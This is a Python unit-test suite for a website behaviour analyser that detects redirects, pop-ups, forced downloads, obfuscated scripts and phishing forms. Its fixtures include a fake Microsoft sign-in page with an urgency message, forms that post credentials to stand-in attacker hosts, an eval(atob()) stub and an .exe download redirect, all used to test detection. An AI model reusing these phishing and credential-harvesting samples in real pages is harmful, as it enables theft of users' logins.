# -*- coding: utf-8 -*-
"""
tests/test_agent8.py
====================
Comprehensive mock-based test suite for Agent 8 -- Website Behavior Analysis.

Tests cover:
    1. Normal webpage analysis
    2. HTTP redirect detection
    3. Multiple HTTP redirects
    4. JavaScript redirect (window.location)
    5. Meta refresh redirect (<meta http-equiv="refresh">)
    6. Pop-up detection (window.open)
    7. No popup (clean)
    8. Forced download detection (Content-Disposition: attachment)
    9. Normal PDF download link
    10. Suspicious executable download attempt (.exe)
    11. JavaScript obfuscation indicators (eval, base64 payload)
    12. Normal JavaScript (clean)
    13. Normal login form
    14. Password field detection
    15. External form submission (cross-origin target)
    16. Hidden form fields detection
    17. Credential harvesting indicators
    18. Possible fake login page indicators
    19. HTTP 403 / restricted website handling
    20. Request timeout handling
    21. Invalid / empty URL input
    22. Browser automation fallback handling
    23. Multiple forms on single page
    24. Strict schema assertion (verifies NO trust score, risk score, or verdict)

Run:
    python tests/test_agent8.py
"""

import sys
import os
import unittest
from unittest.mock import patch, MagicMock
import requests
from bs4 import BeautifulSoup

# Ensure parent directory is in sys.path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="backslashreplace")
    except Exception:
        pass

from agents.agent8_behavior import (
    analyze_behavior,
    get_behavior_evidence,
    normalize_url,
    fetch_webpage,
    analyze_redirects,
    analyze_popups,
    analyze_forced_downloads,
    analyze_javascript_indicators,
    analyze_forms,
    analyze_credential_harvesting,
    analyze_fake_login
)


class TestAgent8Behavior(unittest.TestCase):

    # 1. Normal webpage analysis
    @patch("agents.agent8_behavior.fetch_webpage")
    def test_01_normal_webpage(self, mock_fetch):
        mock_fetch.return_value = {
            "status": "success",
            "status_code": 200,
            "final_url": "https://example.com",
            "headers": {},
            "html": "<html><head><title>Welcome</title></head><body><p>Normal Content</p></body></html>",
            "redirect_count": 0,
            "redirect_chain": ["https://example.com"]
        }

        result = analyze_behavior("https://example.com")
        self.assertIn(result.get("agent"), ("Website Behavior", "Agent 8"))
        self.assertEqual(result.get("status"), "success")
        self.assertIn("input", result)
        self.assertFalse(result["automatic_redirects"]["detected"])
        self.assertFalse(result["popups"]["detected"])
        self.assertFalse(result["forced_downloads"]["detected"])
        self.assertFalse(result["javascript_indicators"]["detected"])

    # 2. HTTP redirect
    def test_02_http_redirect(self):
        fetch_res = {
            "redirect_count": 1,
            "redirect_chain": ["http://example.com", "https://example.com"]
        }
        soup = BeautifulSoup("<html><body>Redirected</body></html>", "html.parser")
        red = analyze_redirects(fetch_res, soup, "")
        self.assertTrue(red["detected"])
        self.assertEqual(red["count"], 1)
        self.assertEqual(red["chain"], ["http://example.com", "https://example.com"])

    # 3. Multiple redirects
    def test_03_multiple_redirects(self):
        fetch_res = {
            "redirect_count": 3,
            "redirect_chain": ["http://example.com", "https://example.com", "https://www.example.com", "https://www.example.com/en/"]
        }
        soup = BeautifulSoup("<html><body>Done</body></html>", "html.parser")
        red = analyze_redirects(fetch_res, soup, "")
        self.assertTrue(red["detected"])
        self.assertEqual(red["count"], 3)
        self.assertEqual(len(red["chain"]), 4)

    # 4. JavaScript redirect
    def test_04_javascript_redirect(self):
        html = '<script>window.location.replace("https://login.example.com");</script>'
        soup = BeautifulSoup(html, "html.parser")
        red = analyze_redirects({"redirect_count": 0, "redirect_chain": []}, soup, html)
        self.assertTrue(red["detected"])
        self.assertTrue(len(red["client_side_redirects"]) > 0)
        self.assertEqual(red["client_side_redirects"][0]["target"], "https://login.example.com")

    # 5. Meta refresh
    def test_05_meta_refresh(self):
        html = '<html><head><meta http-equiv="refresh" content="0;url=https://target.example.com" /></head></html>'
        soup = BeautifulSoup(html, "html.parser")
        red = analyze_redirects({"redirect_count": 0, "redirect_chain": []}, soup, html)
        self.assertTrue(red["detected"])
        self.assertTrue(any(cr["method"] == "meta_refresh" for cr in red["client_side_redirects"]))

    # 6. Popup detection
    def test_06_popup_detection(self):
        html = "<script>function openAd() { window.open('https://promo.example.com', '_blank'); }</script>"
        soup = BeautifulSoup(html, "html.parser")
        pop = analyze_popups(soup, html)
        self.assertTrue(pop["detected"])
        self.assertEqual(pop["count"], 1)

    # 7. No popup
    def test_07_no_popup(self):
        html = "<html><body>Standard page</body></html>"
        soup = BeautifulSoup(html, "html.parser")
        pop = analyze_popups(soup, html)
        self.assertFalse(pop["detected"])
        self.assertEqual(pop["count"], 0)

    # 8. Forced download (Content-Disposition)
    def test_08_forced_download(self):
        fetch_res = {
            "headers": {"Content-Disposition": 'attachment; filename="setup.exe"'}
        }
        soup = BeautifulSoup("", "html.parser")
        downloads = analyze_forced_downloads(fetch_res, soup, "", "https://example.com/download")
        self.assertTrue(downloads["detected"])
        self.assertEqual(downloads["downloads"][0]["file_name"], "setup.exe")
        self.assertTrue(downloads["downloads"][0]["suspicious_extension"])

    # 9. Normal PDF download
    def test_09_normal_pdf_download(self):
        fetch_res = {
            "headers": {"Content-Disposition": 'attachment; filename="annual_report.pdf"'}
        }
        soup = BeautifulSoup("", "html.parser")
        downloads = analyze_forced_downloads(fetch_res, soup, "", "https://example.com/report")
        self.assertTrue(downloads["detected"])
        self.assertEqual(downloads["downloads"][0]["extension"], ".pdf")
        self.assertFalse(downloads["downloads"][0]["suspicious_extension"])

    # 10. Suspicious executable download attempt via JS redirect
    def test_10_suspicious_exe_download(self):
        html = '<script>window.location.href = "https://cdn.example.com/update_payload.exe";</script>'
        soup = BeautifulSoup(html, "html.parser")
        downloads = analyze_forced_downloads({"headers": {}}, soup, html, "https://example.com")
        self.assertTrue(downloads["detected"])
        self.assertTrue(any(d["extension"] == ".exe" and d["suspicious_extension"] for d in downloads["downloads"]))

    # 11. JavaScript obfuscation indicator
    def test_11_javascript_obfuscation(self):
        long_b64 = "A" * 250
        html = f"<script>eval(atob('{long_b64}')); document.createElement('iframe');</script>"
        soup = BeautifulSoup(html, "html.parser")
        js_ind = analyze_javascript_indicators(soup, html)
        self.assertTrue(js_ind["detected"])
        types = [i["type"] for i in js_ind["indicators"]]
        self.assertIn("dynamic_execution", types)
        self.assertIn("obfuscation", types)
        self.assertIn("dynamic_iframe_injection", types)

    # 12. Normal JavaScript
    def test_12_normal_javascript(self):
        html = '<script>console.log("Hello"); let x = 10;</script>'
        soup = BeautifulSoup(html, "html.parser")
        js_ind = analyze_javascript_indicators(soup, html)
        self.assertFalse(js_ind["detected"])
        self.assertEqual(len(js_ind["indicators"]), 0)

    # 13. Normal login form
    def test_13_normal_login_form(self):
        html = """
        <form action="/login" method="POST">
            <input type="text" name="username" />
            <input type="password" name="password" />
            <button type="submit">Sign In</button>
        </form>
        """
        soup = BeautifulSoup(html, "html.parser")
        forms, hidden = analyze_forms(soup, "https://example.com", "example.com")
        self.assertEqual(len(forms), 1)
        self.assertEqual(forms[0]["method"], "POST")
        self.assertTrue(forms[0]["has_password_field"])
        self.assertTrue(forms[0]["same_origin"])
        self.assertFalse(forms[0]["cross_domain_submission"])

    # 14. Password field detection
    def test_14_password_field(self):
        html = '<form action="https://example.com/auth" method="POST"><input type="password" name="user_pwd"></form>'
        soup = BeautifulSoup(html, "html.parser")
        forms, _ = analyze_forms(soup, "https://example.com", "example.com")
        self.assertTrue(forms[0]["has_password_field"])

    # 15. External form submission (cross-domain)
    def test_15_external_form_submission(self):
        html = """
        <form action="https://malicious-collector.com/steal" method="POST">
            <input type="text" name="email" />
            <input type="password" name="password" />
        </form>
        """
        soup = BeautifulSoup(html, "html.parser")
        forms, _ = analyze_forms(soup, "https://example.com", "example.com")
        self.assertEqual(len(forms), 1)
        self.assertTrue(forms[0]["cross_domain_submission"])
        self.assertEqual(forms[0]["destination_domain"], "malicious-collector.com")

    # 16. Hidden fields detection
    def test_16_hidden_fields(self):
        html = """
        <form action="/submit" method="POST">
            <input type="hidden" name="csrf_token" value="xyz123" />
            <input type="text" name="hidden_secret" style="display:none" />
            <input type="text" name="visible_field" />
        </form>
        """
        soup = BeautifulSoup(html, "html.parser")
        _, hidden = analyze_forms(soup, "https://example.com", "example.com")
        self.assertEqual(len(hidden), 1)
        self.assertEqual(hidden[0]["hidden_field_count"], 2)
        self.assertIn("csrf_token", hidden[0]["hidden_fields"])
        self.assertIn("hidden_secret", hidden[0]["hidden_fields"])

    # 17. Credential harvesting indicators
    def test_17_credential_harvesting_indicators(self):
        forms = [{
            "form_index": 1,
            "action": "https://attacker.org/collect",
            "method": "POST",
            "same_origin": False,
            "destination_domain": "attacker.org",
            "cross_domain_submission": True,
            "uses_https": True,
            "has_password_field": True,
            "has_sensitive_fields": True,
            "field_count": 2,
            "fields": ["email", "password"]
        }]
        cred = analyze_credential_harvesting(forms, "", "example.com")
        self.assertTrue(cred["detected"])
        self.assertTrue(any("submits externally" in ind for ind in cred["indicators"]))

    # 18. Possible fake login indicators
    def test_18_fake_login_indicators(self):
        html = """
        <html>
        <head><title>Microsoft Account Login</title></head>
        <body>
            <h2>Sign in to your Microsoft account</h2>
            <p>Your account will be suspended unless verified immediately.</p>
            <form action="https://fake-verify.com/login" method="POST">
                <input type="text" name="username" />
                <input type="password" name="password" />
            </form>
        </body>
        </html>
        """
        soup = BeautifulSoup(html, "html.parser")
        forms = [{
            "form_index": 1,
            "action": "https://fake-verify.com/login",
            "method": "POST",
            "same_origin": False,
            "destination_domain": "fake-verify.com",
            "cross_domain_submission": True,
            "uses_https": True,
            "has_password_field": True,
            "has_sensitive_fields": True,
            "field_count": 2,
            "fields": ["username", "password"]
        }]
        fake = analyze_fake_login(forms, soup, html, "suspicious-phish-domain.com")
        self.assertTrue(fake["potential_fake_login"])
        self.assertTrue(any("Microsoft" in ind for ind in fake["indicators"]))
        self.assertTrue(any("Urgency" in ind for ind in fake["indicators"]))

    # 19. HTTP 403 / restricted website handling
    @patch("agents.agent8_behavior.fetch_webpage")
    def test_19_403_restricted(self, mock_fetch):
        mock_fetch.return_value = {
            "status": "success",
            "status_code": 403,
            "final_url": "https://example.com",
            "headers": {},
            "html": "<html><body>403 Forbidden</body></html>",
            "redirect_count": 0,
            "redirect_chain": ["https://example.com"]
        }
        result = analyze_behavior("https://example.com")
        self.assertEqual(result["status"], "success")

    # 20. Request timeout
    @patch("agents.agent8_behavior.fetch_webpage")
    def test_20_timeout(self, mock_fetch):
        mock_fetch.return_value = {
            "status": "timeout",
            "message": "Request timed out after 10s",
            "final_url": "https://slow.example.com",
            "headers": {},
            "html": "",
            "redirect_count": 0,
            "redirect_chain": ["https://slow.example.com"]
        }
        result = analyze_behavior("https://slow.example.com")
        self.assertEqual(result["status"], "success")
        self.assertTrue(len(result["errors"]) > 0)
        self.assertIn("timed out", result["errors"][0].lower())

    # 21. Invalid URL
    def test_21_invalid_url(self):
        result = analyze_behavior("")
        self.assertEqual(result["status"], "error")
        self.assertTrue(len(result["errors"]) > 0)

    # 22. Browser automation fallback
    def test_22_browser_fallback(self):
        # Even without Playwright / headless browser, static engine produces complete schema
        result = get_behavior_evidence("https://example.com")
        self.assertIn(result["agent"], ("Website Behavior", "Agent 8"))
        self.assertIn("automatic_redirects", result)
        self.assertIn("popups", result)
        self.assertIn("forced_downloads", result)

    # 23. Multiple forms on single page
    def test_23_multiple_forms(self):
        html = """
        <form action="/search" method="GET"><input type="text" name="q" /></form>
        <form action="/login" method="POST"><input type="password" name="pwd" /></form>
        <form action="/newsletter" method="POST"><input type="email" name="sub_email" /></form>
        """
        soup = BeautifulSoup(html, "html.parser")
        forms, _ = analyze_forms(soup, "https://example.com", "example.com")
        self.assertEqual(len(forms), 3)
        self.assertEqual(forms[0]["method"], "GET")
        self.assertEqual(forms[1]["method"], "POST")
        self.assertTrue(forms[1]["has_password_field"])

    # 24. Strict Schema Assertion: NO trust/risk scores or verdicts allowed
    @patch("agents.agent8_behavior.fetch_webpage")
    def test_24_schema_no_risk_scores(self, mock_fetch):
        mock_fetch.return_value = {
            "status": "success",
            "status_code": 200,
            "final_url": "https://example.com",
            "headers": {},
            "html": "<html><body>Hello</body></html>",
            "redirect_count": 0,
            "redirect_chain": ["https://example.com"]
        }
        result = analyze_behavior("https://example.com")

        forbidden_keys = [
            "trust_score", "trustscore", "risk_score", "riskscore",
            "phishing_probability", "verdict", "final_score",
            "classification", "confidence"
        ]
        for key in forbidden_keys:
            self.assertNotIn(key, result, f"Agent 8 response MUST NOT contain forbidden score/verdict key '{key}'")


def run_all_tests():
    suite = unittest.TestLoader().loadTestsFromTestCase(TestAgent8Behavior)
    runner = unittest.TextTestRunner(verbosity=2)
    test_result = runner.run(suite)
    print("\n" + "=" * 60)
    print(f"Agent 8 Test Suite Results: Ran {test_result.testsRun} tests.")
    if test_result.wasSuccessful():
        print("ALL AGENT 8 TESTS PASSED SUCCESSFULLY.")
    else:
        print(f"FAILURES: {len(test_result.failures)}, ERRORS: {len(test_result.errors)}")
    print("=" * 60)
    return test_result.wasSuccessful()


if __name__ == "__main__":
    success = run_all_tests()
    sys.exit(0 if success else 1)
